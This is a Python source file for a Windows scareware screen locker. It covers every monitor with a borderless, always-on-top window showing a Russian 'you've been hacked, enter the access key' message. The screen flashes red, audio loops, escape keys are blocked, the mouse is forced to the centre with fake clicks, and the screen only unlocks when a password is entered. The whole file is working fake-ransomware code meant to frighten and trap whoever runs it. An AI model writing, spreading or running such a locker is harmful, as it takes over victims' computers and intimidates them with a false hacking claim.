import ctypes
import os
import tkinter as tk
from tkinter import messagebox

PASSWORD = os.getenv("LOCKSCREEN_PASSWORD", "+ä-+ä-+ä-")


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", ctypes.c_long),
        ("top", ctypes.c_long),
        ("right", ctypes.c_long),
        ("bottom", ctypes.c_long),
    ]


def get_monitor_bounds():
    monitors = []

    def callback(h_monitor, hdc_monitor, lprc_monitor, dw_data):
        rect = lprc_monitor.contents
        monitors.append((rect.left, rect.top, rect.right, rect.bottom))
        return True

    monitor_enum = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(RECT), ctypes.c_void_p)(callback)
    user32 = ctypes.windll.user32

    if not user32.EnumDisplayMonitors(None, None, monitor_enum, 0):
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        monitors.append((0, 0, width, height))

    return monitors


class LockScreen(tk.Toplevel):
    def __init__(self, monitor_bounds, close_all):
        super().__init__()
        self.close_all = close_all
        self.is_closed = False
        self.monitor_left, self.monitor_top, self.monitor_right, self.monitor_bottom = monitor_bounds
        self.monitor_width = self.monitor_right - self.monitor_left
        self.monitor_height = self.monitor_bottom - self.monitor_top

        self.title("Zugriff gesperrt")
        self.geometry(f"{self.monitor_width}x{self.monitor_height}+{self.monitor_left}+{self.monitor_top}")
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.configure(bg="black")
        self.focus_force()

        self.protocol("WM_DELETE_WINDOW", self.close_app)
        self.bind("<Escape>", lambda event: "break")
        self.bind("<Alt-F4>", lambda event: "break")
        self.bind("<KeyPress>", lambda event: "break")

        # Maus in die Mitte zurücksetzen und alle 0.2s einen Klick simulieren
        self.bind("<Motion>", self.keep_mouse_centered)
        self.bind("<Button-1>", self.keep_mouse_centered)
        self.bind("<Button-2>", self.keep_mouse_centered)
        self.bind("<Button-3>", self.keep_mouse_centered)
        self.after(500, self.fake_click)
        self.after(50, self.center_mouse)

        self.start_audio()

        self.red_mode = False
        self.after(1000, self.blink_background)

        self.label = tk.Label(
            self,
            text="Тебя взломали, введи ключ доступа, пожалуйста.",
            bg="black",
            fg="white",
            font=("Arial", 24, "bold")
        )
        self.label.pack(expand=True)

        frame = tk.Frame(self, bg="black")
        frame.pack(pady=20)

        tk.Label(frame, text="Passwort:", bg="black", fg="white", font=("Arial", 12)).pack()
        self.entry = tk.Entry(frame, width=30, font=("Arial", 12), show="*")
        self.entry.pack(pady=8)
        self.entry.focus_set()

        btn = tk.Button(
            frame,
            text="Bestätigen",
            command=self.check_password,
            width=20,
            font=("Arial", 11)
        )
        btn.pack(pady=10)

        self.bind("<Return>", lambda event: self.check_password())

    def start_audio(self):
        try:
            self.mci_send = ctypes.windll.winmm.mciSendStringW
        except Exception:
            self.audio_aliases = []
            return

        self.audio_aliases = []
        audio_dir = os.path.dirname(os.path.abspath(__file__))

        for index, filename in enumerate(("s1.mp3", "s2.mp3", "s3.mp3")):
            path = os.path.join(audio_dir, filename)
            if not os.path.isfile(path):
                continue

            alias = f"lockscreen_audio_{index}"
            command = f'open "{path}" type mpegvideo alias {alias}'
            try:
                if self.mci_send(command, None, 0, None) != 0:
                    continue
                if self.mci_send(f"play {alias} repeat", None, 0, None) != 0:
                    self.mci_send(f"close {alias}", None, 0, None)
                    continue
                self.audio_aliases.append(alias)
            except Exception:
                continue

    def close_app(self):
        if self.is_closed:
            return
        self.is_closed = True
        self.close_all()

    def stop_audio(self):
        for alias in getattr(self, "audio_aliases", []):
            self.mci_send(f"stop {alias}", None, 0, None)
            self.mci_send(f"close {alias}", None, 0, None)
        self.audio_aliases = []

    def center_mouse(self):
        try:
            center_x = self.monitor_left + (self.monitor_width // 2)
            center_y = self.monitor_top + (self.monitor_height // 2)
            ctypes.windll.user32.SetCursorPos(center_x, center_y)
        except Exception:
            pass
        self.after(1, self.center_mouse)

    def keep_mouse_centered(self, event=None):
        self.center_mouse()

    def fake_click(self):
        try:
            x = self.monitor_left + (self.monitor_width // 2)
            y = self.monitor_top + (self.monitor_height // 2)
            ctypes.windll.user32.SetCursorPos(x, y)
            ctypes.windll.user32.mouse_event(0x0002, x, y, 0, 0)  # left down
            ctypes.windll.user32.mouse_event(0x0004, x, y, 0, 0)  # left up
        except Exception:
            pass
        self.after(200, self.fake_click)

    def blink_background(self):
        self.red_mode = not self.red_mode
        if self.red_mode:
            color = "red"
            delay = 250
        else:
            color = "black"
            delay = 500

        self.configure(bg=color)
        self.label.configure(bg=color, fg="white")
        self.after(delay, self.blink_background)

    def check_password(self):
        if PASSWORD is None:
            messagebox.showerror("Fehler", "Passwort nicht konfiguriert. Setze die Umgebungsvariable LOCKSCREEN_PASSWORD.")
            return

        if self.entry.get() == PASSWORD:
            self.close_app()
        else:
            messagebox.showerror("Fehler", "Falsches Passwort.")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()

    windows = []

    def close_all():
        for window in windows:
            window.stop_audio()
            window.destroy()
        root.destroy()

    for bounds in get_monitor_bounds():
        window = LockScreen(bounds, close_all)
        windows.append(window)

    root.mainloop()